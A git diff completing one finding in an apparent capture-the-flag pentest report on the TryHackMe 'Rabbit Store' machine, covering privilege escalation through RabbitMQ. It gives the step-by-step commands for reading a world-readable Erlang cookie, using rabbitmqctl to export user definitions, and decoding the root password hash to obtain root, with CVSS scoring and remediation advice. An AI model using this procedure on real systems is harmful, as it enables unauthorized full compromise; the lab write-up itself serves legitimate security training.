@@ -164,18 +164,78 @@ Where possible, do not allow users to create or modify templates. If template su
 ---
 
 ### 4. Privilege Escalation via RabbitMQ  
-**CVSS v4.0 Base Score:** 
+**CVSS v4.0 Base Score:** 9.3 (Critical)  
+CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:H/SA:N  
 
+**CVSS Justification:**  
+By retrieving the Erlang cookie (accessible to a low-privileged account), it was possible to export RabbitMQ definitions containing the root user’s password hash. Once the hash was decoded, full root access was gained to the target system reflecting the critical CVSS score attributed to this discovery.  
 
-**Summary:** 
+**Summary:**  
+Post-compromise enumeration of the target system located the erlang cookie which is required to perform authenticated actions on connected nodes. In this instance this allowed the extraction of data from the RabbitMQ node, this included the root user’s password hash. When successfully decoded this hash was used to gain full root privilege on the target system.  
 
-**Background:** 
+**Background:**  
+When enumerating the target system, it was discovered that the `.erlang.cookie` was present and accessible to our user at `/var/lib/rabbitmq/.erlang.cookie`. RabbitMQ/Erlang distribution authentication relies on `.erlang.cookie`. This allowed the use of the RabbitMQ command line tool from the attacking machine to authenticate to the RabbitMQ node and perform data extraction. The `root` user's hash was extracted and then used to gain full root access to the target system.  
 
 **Technical details & Evidence:** 
+During initial enumeration it was found that the Erlang Port Mapper Daemon (epmd) and a RabbitMQ node were present on the target system. As such, initial recon of the target host by a low-privileged user included searching for the `.erlang.cookie` via the following command:  
+```bash
+azrael@forge:/$ find / -type f -name ".erlang.cookie" 2>/dev/null
+/var/lib/rabbitmq/.erlang.cookie
+azrael@forge:/$ cat /var/lib/rabbitmq/.erlang.cookie
+[REDACTED]
+```
+The cookie was located in `/var/lib/rabbitmq/` directory and was accessible to the `azrael` user.
 
-**Impact:** 
+This cookie was then used with the `rabbitmqctl` tool from the attacking machine to perform authenticated actions on the RabbitMQ instance which was located at `rabbit@forge`. 
 
-**Remediation Advice:** 
+First the status of the node was confirmed.
+```bash
+sudo rabbitmqctl --erlang-cookie '[REDACTED]' --node rabbit@forge status
+```
+![Flag2 - rabbitmqctl status.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Rabbit_Store/Images/Flag2%20-%20rabbitmqctl%20status.png)    
+
+User enumeration was then performed.  
+```bash
+sudo rabbitmqctl --erlang-cookie '[REDACTED]' --node rabbit@forge list_users
+```
+![Flag2 - rabbitmqctl users.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Rabbit_Store/Images/Flag2%20-%20rabbitmqctl%20users.png)  
+This provided the details of one user the `root` user. Next the user definitions were extracted which contain detailed information about each user, including their password hash.  
+```bash
+sudo rabbitmqctl --erlang-cookie '[REDACTED]' --node rabbit@forge export_definitions /tmp/rabbit_defs.json
+```
+![Flag2 - rabbitmqctl get defs.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Rabbit_Store/Images/Flag2%20-%20rabbitmqctl%20get%20defs.png)  
+
+Once the definitions had been extracted, these could be output as below to obtain the `root` user’s password hash value. 
+```bash
+jq -c '.users[] | select(.name=="root")' /tmp/rabbit_defs.json
+```
+```JSON
+{"hashing_algorithm":"rabbit_password_hashing_sha256",
+"limits":{},
+"name":"root",
+"password_hash":"[REDACTED]",
+"tags":["administrator"]}
+```
+When the user list was output, there was a comment listed along with the root user's. This indicated that the password hash of the `root` user could be used as their login password. Upon reviewing RabbitMQ password details it was found that the hash includes a 32-bit salt which is prepended to the password prior to SHA-256 hashing, and the result is base64-encoded.  
+
+The hash can be extracted via the following command:
+```bash
+echo -n "[REDACTED]" | base64 -d | xxd -p -c 100
+[REDACTED]
+```
+The output still contains the 32-bit salt which when removed leaves only the password hash. This value was then used to gain `root` access to the target system.
+```bash
+azrael@forge:/$ su root                                                         
+Password:                                                                    
+root@forge:/# id                                                        
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+**Impact:**    
+Full compromise of target system as the root user with the highest level of privilege possible. Attackers can pivot to other hosts, establish persistence for long-term access, or conduct further intrusions and monitoring.   
+
+**Remediation Advice:**  
+Harden RabbitMQ: restrict epmd/rabbit ports to internal management networks, ensure `.erlang.cookie` ownership and permissions prevent reading by non-privileged users. Also restrict network exposure of epmd (port `4369`) and RabbitMQ distribution/management ports, rotate cookies and credentials, and log and monitor export operations.  
 
 ---
 ## Appendices  
@@ -183,3 +243,4 @@ Where possible, do not allow users to create or modify templates. If template su
 [Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)  
 [CVSS 4.0](https://www.first.org/cvss/calculator/4-0)  
 [Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)  
+[RabbitMQ Passwords](https://www.rabbitmq.com/docs/passwords)
